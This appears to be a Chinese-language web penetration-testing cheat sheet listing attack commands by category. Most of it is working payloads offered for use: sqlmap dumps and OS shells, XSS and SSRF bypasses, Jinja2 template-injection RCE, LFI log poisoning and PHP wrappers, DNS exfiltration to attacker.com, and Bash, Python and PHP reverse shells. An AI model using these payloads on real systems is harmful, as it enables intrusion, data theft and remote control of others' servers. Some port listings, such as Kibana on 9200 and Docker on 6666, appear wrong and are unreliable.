# Web 渗透工具速查

<!-- 目录 -->
<!-- 1. SQL 注入 -->
<!-- 2. XSS -->
<!-- 3. SSRF -->
<!-- 4. SSTI -->
<!-- 5. LFI/RFI -->
<!-- 6. RCE -->
<!-- 7. 命令注入 -->
<!-- 8. 其他工具 -->

---

## 1. SQL 注入 (SQL Injection)

### sqlmap 基本使用

```bash
# 扫描 URL 中的 SQL 注入
sqlmap -u "http://target.com/?id=1"

# 指定参数
sqlmap -u "http://target.com/" --data="id=1&name=test"

# 指定数据库类型
sqlmap -u "http://target.com/?id=1" --dbms=mysql

# 获取数据库列表
sqlmap -u "http://target.com/?id=1" --dbs

# 获取表名
sqlmap -u "http://target.com/?id=1" -D database_name --tables

# 获取列名
sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --columns

# 导出数据
sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --dump

# 使用代理
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

# 绕过 WAF
sqlmap -u "http://target.com/?id=1" --tamper="space2comment,charencode"

# 交互式 shell
sqlmap -u "http://target.com/?id=1" --os-shell
```

### sqlmap 常用 tamper 脚本

| 脚本 | 作用 | 适用场景 |
|------|------|----------|
| `space2comment` | 空格替换为注释 | 过滤空格 |
| `charencode` | URL 编码 | 编码过滤 |
| `between` | 用 `BETWEEN` 替换 `>` | 过滤比较符号 |
| `randomcase` | 随机大小写 | 过滤大小写关键字 |
| `space2hash` | 空格替换为 `#` + 随机字符 | 过滤空格 |

---

## 2. XSS (Cross-Site Scripting)

### xsstrike 基本使用

```bash
# 扫描 XSS
xsstrike -u "http://target.com/?q=test"

# 指定参数
xsstrike -u "http://target.com/" --data "q=test"

# 扫描并绕过
xsstrike -u "http://target.com/?q=test" --fuzzer

# DOM 扫描
xsstrike -u "http://target.com/" --dom
```

### 常用 XSS Payload

```javascript
// 基础弹框测试
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">

// 绕过过滤
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<scr<script>ipt>alert(1)</scr</script>ipt>

// 事件绕过
onclick=alert(1)
onmouseover=alert(1)

// URL 跳转
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## 3. SSRF (Server-Side Request Forgery)

### 常用协议

```bash
# file:// 读取本地文件
http://target.com/?url=file:///etc/passwd

# dict:// 探测端口
http://target.com/?url=dict://localhost:22

# gopher:// 发送任意协议请求
http://target.com/?url=gopher://127.0.0.1:6379/_INFO

# http:// 内网扫描
http://target.com/?url=http://192.168.1.1/admin
```

### 常用绕过技巧

| 绕过方式 | 示例 | 说明 |
|----------|------|------|
| localhost | `127.0.0.1`, `localhost`, `0.0.0.0` | 绕过 blacklist |
| URL 编码 | `127%E2%80%A20.0.0.1` | URL 编码绕过 |
| 进制转换 | `2130706433` (十进制 IP) | 数字 IP |
| 域名指向 | `xip.io`, `nip.io` | 指向任意 IP |
| 302 重定向 | 自己的服务器做重定向 | 绕过检查 |

---

## 4. SSTI (Server-Side Template Injection)

### 模板注入测试

```bash
# 基础测试
{{7*7}}
${7*7}
<%= 7*7 %>
{{7*'7'}}

# 盲注测试
{{config}}
{{request}}
{{.ua}}
```

### Jinja2 常用 Payload

```python
# 获取 config
{{ config }}
{{ config.items() }}

# 文件读取
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# 命令执行
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/eval', 'w').write('import os; os.system("id")') }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Flask/Jinja2 RCE
{{ ''.__class__.__bases__[0].__subclasses__()[59]._modules['os'].popen('id').read() }}
```

---

## 5. LFI/RFI (Local/Remote File Inclusion)

### 基本利用

```bash
# 基本 LFI
http://target.com/?page=/etc/passwd
http://target.com/?page=../../etc/passwd

# Null byte 绕过 (PHP < 5.3.4)
http://target.com/?page=/etc/passwd%00

# 日志污染
# 写入 payload 到日志
curl "http://target.com/<script>alert(1)</script>"
# 然后包含日志
http://target.com/?page=/var/log/apache2/access.log

# Session 文件包含
http://target.com/?page=/tmp/sess_PHPSESSID
```

### PHP Wrapper

```bash
# php://filter 读取源码
http://target.com/?page=php://filter/read=convert.base64-encode/resource=index.php

# data:// 执行代码
http://target.com/?page=data://text/plain,<?php system('id');?>

# expect:// 命令执行 (需要 expect 扩展)
http://target.com/?page=expect://id
```

---

## 6. RCE (Remote Code Execution)

### 命令执行检测

```bash
# 时间盲注
sleep 5
&& sleep 5
; sleep 5

# DNS 外带
curl http://attacker.com/?$(whoami)
ping -c 1 $(whoami).attacker.com
```

### 常用 RCE Payload

```bash
# Linux
;id
| id
&& id
`id`
$(id)

# Windows
whoami
dir
type C:\\windows\\win.ini
```

### 反向 Shell

```bash
# Bash 反向 shell
bash -i >& /dev/tcp/attacker/port 0>&1

# Python 反向 shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# PHP 反向 shell
php -r '$sock=fsockopen("attacker",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## 7. 命令注入

### curl 常用选项

```bash
# 基本请求
curl -s http://target.com/

# 显示响应头
curl -I http://target.com/

# 显示完整响应
curl -i http://target.com/

# 下载文件
curl -O http://target.com/file
curl -o output.txt http://target.com/file

# POST 请求
curl -d "user=admin&pass=123" http://target.com/login
curl -X POST -d @data.json http://target.com/api

# 设置 Header
curl -H "Content-Type: application/json" http://target.com/api
curl -H "Authorization: Bearer token" http://target.com/api

# 使用代理
curl -x http://127.0.0.1:8080 http://target.com/

# 跟随重定向
curl -L http://target.com/

# 上传文件
curl -F "file=@test.txt" http://target.com/upload

# 跳过 SSL 验证
curl -k https://target.com/

# 请求超时
curl --max-time 10 http://target.com/

# 显示详细过程
curl -v http://target.com/
curl --trace output.txt http://target.com/
```

---

## 8. 其他常用工具

### commix (命令注入检测)

```bash
# 基本扫描
commix -u "http://target.com/?id=1"

# 指定参数
commix -u "http://target.com/" --data="id=1"

# 使用代理
commix -u "http://target.com/" --proxy="http://127.0.0.1:8080"
```

### ffuf / dirb (目录扫描)

```bash
# 目录扫描
ffuf -w wordlist.txt -u http://target.com/FUZZ

# 子域名扫描
ffuf -w wordlist.txt -u http://FUZZ.target.com/

# 使用代理
ffuf -w wordlist.txt -u http://target.com/FUZZ -proxy http://127.0.0.1:8080
```

```bash
# dirb 基本使用
dirb http://target.com/
dirb http://target.com/ wordlist.txt
```

---

## 常用端口对应服务

| 端口 | 服务 | 说明 |
|------|------|------|
| 80, 443, 8080 | HTTP/HTTPS | Web 服务 |
| 22 | SSH | 远程连接 |
| 21 | FTP | 文件传输 |
| 3306 | MySQL | 数据库 |
| 5432 | PostgreSQL | 数据库 |
| 6379 | Redis | 缓存数据库 |
| 11211 | Memcached | 缓存 |
| 27017 | MongoDB | 数据库 |
| 9200 | Elasticsearch | 搜索引擎 |
| 9200 | Kibana | 可视化 |
| 5000 | Flask | Python Web |
| 8000 | Django | Python Web |
| 3000 | Node | Node.js |
| 6666 | Docker | 容器 |
| 2375 | Docker API | 未授权访问 |

---

## HTTP 状态码速查

| 状态码 | 含义 |
|--------|------|
| 200 | OK |
| 201 | Created |
| 301/302 | 重定向 |
| 400 | Bad Request |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 405 | Method Not Allowed |
| 500 | Internal Server Error |
| 502 | Bad Gateway |
| 503 | Service Unavailable |
